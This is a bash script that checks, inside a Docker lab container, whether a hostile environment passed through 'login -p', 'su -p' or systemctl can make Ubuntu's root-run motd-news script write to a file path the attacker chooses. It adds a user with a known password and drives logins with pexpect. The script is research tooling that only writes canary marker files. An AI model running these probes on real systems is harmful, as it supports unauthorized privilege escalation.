#!/usr/bin/env bash
set -euo pipefail

container="${1:-ubuntu24-server-lpe-target}"

docker exec -i "$container" bash -s <<'EOS'
set -u

section() {
  printf '\n== %s ==\n' "$1"
}

ROOT_MARKER=/root/motd_news_cache_env_root
TMP_MARKER=/tmp/motd_news_cache_env_root

section "target and package proof"
sed -n '1,8p' /etc/os-release
uname -a
id attacker
id selfauth 2>/dev/null || useradd -m -s /bin/bash selfauth
printf 'selfauth:selfauth\n' | chpasswd
passwd -u selfauth >/dev/null 2>&1 || true
dpkg-query -W -f='${binary:Package}\t${Version}\t${db:Status-Abbrev}\n' \
  base-files login libpam-modules libpam-runtime python3-pexpect wget systemd \
  2>/dev/null | sort

section "default MOTD/login code paths"
nl -ba /etc/default/motd-news
nl -ba /etc/update-motd.d/50-motd-news | sed -n '32,62p;135,143p'
nl -ba /etc/pam.d/login | sed -n '26,55p'
grep -RIn pam_motd /etc/pam.d /usr/share/pam-configs 2>/dev/null || true
stat -Lc '%A %U:%G %n' /etc/default/motd-news /etc/update-motd.d/50-motd-news \
  /etc/pam.d/login /usr/bin/login /usr/bin/su /var/cache 2>&1 || true

section "root-only impact canary"
rm -f "$ROOT_MARKER" "$TMP_MARKER"
env -i CACHE="$ROOT_MARKER" URLS=https://example.invalid ENABLED=1 \
  /etc/update-motd.d/50-motd-news 2>&1
echo "direct_root_script_rc=$?"
stat -Lc '%A %U:%G %s %n' "$ROOT_MARKER" 2>&1 || true
rm -f "$ROOT_MARKER"

section "uid1001 direct trigger attempts"
runuser -u attacker -- bash -s <<'USER'
set -u
id
ROOT_MARKER=/root/motd_news_cache_env_root
TMP_MARKER=/tmp/motd_news_cache_env_root
rm -f "$TMP_MARKER"
env CACHE="$ROOT_MARKER" URLS=https://example.invalid ENABLED=1 \
  /etc/update-motd.d/50-motd-news 2>&1
echo "attacker_script_rc=$?"
env CACHE="$ROOT_MARKER" URLS=https://example.invalid ENABLED=1 \
  /usr/bin/login -p selfauth </dev/null 2>&1
echo "attacker_login_rc=$?"
systemctl set-environment CACHE="$ROOT_MARKER" 2>&1
echo "set_environment_rc=$?"
systemctl start motd-news.service 2>&1
echo "start_motd_news_rc=$?"
test -e "$ROOT_MARKER"; echo "root_marker_visible_rc=$?"
test -e "$TMP_MARKER"; echo "tmp_marker_rc=$?"
USER

section "real login -p PAM session with hostile environment"
CACHE="$ROOT_MARKER" URLS=https://example.invalid ENABLED=1 python3 - <<'PY'
import os
import pexpect

env = os.environ.copy()
child = pexpect.spawn('/bin/login', ['-p', 'selfauth'], env=env, encoding='utf-8', timeout=10)
try:
    first = child.expect(['Password:', r'[$#] ', pexpect.EOF, pexpect.TIMEOUT])
    print('login_expect1=', first)
    print(child.before[-500:])
    if first == 0:
        child.sendline('selfauth')
        second = child.expect([r'[$#] ', 'Login incorrect', pexpect.EOF, pexpect.TIMEOUT], timeout=15)
        print('login_expect2=', second)
        print(child.before[-800:])
        if second == 0:
            child.sendline('id; env | grep -E "^(CACHE|URLS|ENABLED)=" || true; exit')
            child.expect(pexpect.EOF, timeout=10)
            print(child.before[-1200:])
finally:
    child.close(force=True)
PY
echo "login_pam_rc=$?"
stat -Lc '%A %U:%G %s %n' "$ROOT_MARKER" "$TMP_MARKER" 2>&1 || true

section "setuid su -p session check"
runuser -u selfauth -- python3 - <<'PY'
import os
import pexpect

env = os.environ.copy()
env['CACHE'] = '/root/motd_news_cache_env_root'
env['URLS'] = 'https://example.invalid'
env['ENABLED'] = '1'
child = pexpect.spawn('/usr/bin/su', ['-p', 'selfauth', '-c', 'id; env | grep -E "^(CACHE|URLS|ENABLED)=" || true'], env=env, encoding='utf-8', timeout=10)
try:
    i = child.expect(['Password:', pexpect.EOF, pexpect.TIMEOUT])
    print('su_expect1=', i)
    print(child.before[-500:])
    if i == 0:
        child.sendline('selfauth')
        child.expect(pexpect.EOF, timeout=10)
        print(child.before[-1000:])
finally:
    child.close(force=True)
PY
echo "su_p_rc=$?"
stat -Lc '%A %U:%G %s %n' "$ROOT_MARKER" "$TMP_MARKER" 2>&1 || true

section "cleanup and health"
rm -f "$ROOT_MARKER" "$TMP_MARKER"
systemctl unset-environment CACHE URLS ENABLED 2>/dev/null || true
systemctl is-system-running || true
systemctl --failed --no-legend || true
EOS
